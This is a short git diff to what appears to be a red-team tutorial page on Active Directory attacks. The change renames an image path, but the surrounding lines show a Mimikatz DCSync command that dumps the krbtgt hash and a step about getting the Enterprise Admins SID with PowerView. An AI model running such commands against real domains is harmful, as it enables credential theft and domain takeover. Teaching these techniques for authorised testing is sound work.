@@ -36,7 +36,7 @@ To execute the attack we need a couple bits of information:
 Invoke-MimiKatz -Command '"lsadump::dcsync /user:amsterdam\krbtgt /domain:amsterdam.bank.local"'
 ```
 
-![](<../../../.gitbook/assets/image (22) (1).png>)
+![](<../../../.gitbook/assets/image (22) (1) (1).png>)
 
 4\. Retrieve the SID of the enterprise Admins group, using PowerView:
 
